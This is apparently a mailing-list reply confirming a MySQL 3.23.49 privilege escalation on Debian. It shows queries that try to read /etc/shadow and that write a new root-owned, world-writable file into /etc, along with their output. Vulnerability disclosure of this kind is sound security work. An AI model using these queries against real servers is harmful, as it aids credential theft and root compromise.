Subject: Re: MySQL user can be changed to root



I can confirm this privilege escalation in mysql-server   3.23.49-8.2 
(debian/stable on linux/i386). Any mysql user with file privileges can trick 
the mysql server into running as root on restart of the mysql subsystem.

Note that mysql prevents you from reading non-world-readable files outside 
the mysql data directory, or overwriting existing files. You can create new 
files as root, though.

mysql> load data infile '/etc/shadow' into table readtext;
ERROR 1085: The file '/etc/shadow' must be in the database directory or be 
readable by all
mysql> select * into outfile '/etc/somenewfile' from hack;
Query OK, 2 rows affected (0.00 sec)

-rw-rw-rw-    1 root     root           19 Mar 10 17:22 /etc/somenewfile

Not a rootshell, yet, but lots of new avenues from here.
